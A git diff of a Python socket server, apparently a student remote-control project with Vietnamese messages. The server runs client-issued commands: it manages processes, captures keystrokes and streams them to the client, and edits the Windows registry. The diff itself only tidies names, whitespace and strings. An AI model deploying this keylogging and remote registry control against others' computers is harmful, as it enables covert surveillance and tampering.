@@ -25,6 +25,7 @@ def Server_Running():
         list_name = ['' for i in range(100)]
         list_id = ['' for i in range(100)]
         list_thread = ['' for i in range(100)]
+
         for line in proc.stdout:
             if line.rstrip():
                 if count < 2:
@@ -86,13 +87,14 @@ def Server_Running():
                         while True:                       
                             check = client.recv(1024).decode("utf8")
                             print(check)
-                            if check == "Unhook Key" or check == "Xem Key":                 
+                            if check == "Unhook Key":                 
                                 KeyStop = False
                                 break
                     finally:
                         keyboard.release(Key.space)
                 break
         t1 = threading.Thread(target=Stop)
+
         def KeyLogger():
             while True:
                 def on_press(key):
@@ -102,6 +104,7 @@ def Server_Running():
                     if KeyStop == False: listener.stop()
                 with Listener(on_release = on_release, on_press = on_press) as listener:
                     listener.join()
+
                 def write(keys):
                     global count
                     count = 0
@@ -156,6 +159,7 @@ def Server_Running():
                         keylog += k
                         count+=1
                     return keylog[0:]
+
                 data = write(keys)
                 client.sendall(bytes(str(count),"utf8"))
                 check = client.recv(1024).decode("utf8")
@@ -248,7 +252,6 @@ def Server_Running():
         import subprocess    
         cmd = 'powershell reg import data.reg'
         subprocess.Popen(cmd, shell=True)
-
     def LayRegValue():
         import winreg
         Name = client.recv(1024).decode("utf8")
@@ -268,7 +271,7 @@ def Server_Running():
         elif hkey[0] == "HKEY_CURRENT_CONFIG":
             keylink = winreg.HKEY_CURRENT_CONFIG
         else:
-            client.sendall(bytes("Sai đường dẫn", "utf8"))
+            client.sendall(bytes("Sai duong dan", "utf8"))
             check = client.recv(1024).decode("utf8")
             return
         
@@ -289,7 +292,7 @@ def Server_Running():
                             check = client.recv(1024).decode("utf8")
                             break
             except:
-                client.sendall(bytes("Sai đường dẫn", "utf8"))
+                client.sendall(bytes("Sai duong dan", "utf8"))
                 check = client.recv(1024).decode("utf8")
     def SetValue():
         import winreg
@@ -342,7 +345,7 @@ def Server_Running():
                     client.sendall(bytes("succeed", "utf8"))
                     check = client.recv(1024).decode("utf8")  
             except:
-                client.sendall(bytes("Sai đường dẫn", "utf8"))
+                client.sendall(bytes("Sai duong dan", "utf8"))
                 check = client.recv(1024).decode("utf8")
     def Createkey():
         import winreg
@@ -417,8 +420,7 @@ def Server_Running():
             client.sendall(bytes("Sai duong dan", "utf8"))
             check = client.recv(1024).decode("utf8")
             return
-
-    def DeleteValue1():
+    def DeleteRegValue():
         import winreg
         
         def del_key_1(key, sub_key, name,):
@@ -465,6 +467,7 @@ def Server_Running():
             client.sendall(bytes("Sai duong dan", "utf8"))
     
         xacnhan = client.recv(1024).decode("utf8")       
+
     #Command cho server:
     while True:
         #try:
@@ -472,6 +475,7 @@ def Server_Running():
             if i == "Xem App": App_running(HOST,PORT)
             elif i == "Xoa App": 
                 ID_App = client.recv(1024).decode("utf8") 
+                client.sendall(bytes("Da nhan ID", "utf8"))
                 App_running_kill(ID_App)
             elif i == "Bat App":
                 Name = client.recv(1024).decode("utf8")
@@ -489,12 +493,11 @@ def Server_Running():
             elif i == "Nhan Reg": NhanReg()
             elif i == "Get value reg": LayRegValue()
             elif i == "Create key reg": Createkey()
-            elif i == "Delete Value Reg": DeleteValue1() 
+            elif i == "Delete Value Reg": DeleteRegValue() 
             elif i == "Delete key": Deletekey()
             elif i == "Set registry value": SetValue()
             elif i == "Create key reg": Createkey()
             elif i == "Delete key": Deletekey()
-            elif i == "Delete Value Reg": DeleteValue1()
 
         Command = client.recv(1024).decode("utf8")
         client.sendall(bytes("Da nhan lenh","utf8"))
